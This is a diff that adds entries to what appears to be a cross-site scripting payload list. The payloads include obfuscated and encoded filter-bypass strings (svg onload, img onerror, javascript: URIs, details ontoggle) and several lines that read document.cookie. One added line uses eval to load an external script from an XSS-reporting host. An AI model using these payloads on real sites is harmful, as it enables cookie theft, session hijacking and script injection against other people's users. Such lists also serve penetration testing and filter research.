@@ -1,4 +1,6 @@
 "%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+&lt;img longdesc="src='x'onerror​=alert(document.domain);//&gt;&lt;img " src='showme'&gt;
+<svg onload​='setTimeout(function() { alert("1"); }, 100);'>
 "/><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
 %20%27%3C00%20foo%3D%22%3Ca%2520href%3D%22javascript%3Aalert%28%27XSS-Bypass%27%29%22%3EXSS-CLick%3C%2F00%3E--%2520%2F
  '<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/
@@ -26,3 +28,24 @@ OnXSS=<Img/Src/OnError=alert(1)>
 <%2Fstyle><%2Fscript><script>alert%28"XSS"%29<%2Fscript> 
  javascript%3A%2561lert%281%29 javascript%3A%7B+alert%600%60+%7D 
 javascript%3A%2F%2F%250Aalert%281%29 
+?msg=%3Csvg%2Fonload%3Dalert%28%22XSS%22%29%20%3E, <svg/onload​=alert("XSS") > 
+
+utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
+
+<a+HREF="%26%237 javascrip%26%239t: alert%261par;document .domain) *> 
+
+”/>&_lt;_script>alert(1)&_lt;/script>”/>
+
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover​=prompt&#40;1&#41;&#47;&#47;">XYZ</a>
+
+<​script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/<​/script /***/
+"><img src="/" =_=" title="onerror='prompt(document.cookie)'">.png
+eval('var a=document.createElement(\'script\');a.src=\'https://xss[.]report/c/santiko86); alert("XSSed by santiko1986")');
+
+1'"<S><A HRef=tel:/*%26apos;;/*%26quot;;/*%26lt;s%26gt;%26lt;Img/Src/*/O%26%2378;Error=alert(1)//%26gt; Title=tel:/*%26apos;;/*%26quot;;/*%26lt;s%26gt;%26lt;Img/Src/*/O%26%2378;Error=alert(1)//%26gt;>
+"><img src="/" =_=" title="onerror​='prompt(document.cookie)'">.png
+ellm1%3cscript%3ealert(1)%3c%2fscript%3ec2xwc
+"><iNput///type="password"////id="CF-bypaSS" name="query"////value=""///oNfocUs​="alert('hello')" AutOfoCus="" />
+&lt;img longdesc="src='x'onerror​=alert(document.domain);//&gt;&lt;img " src='showme'&gt;
+<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+
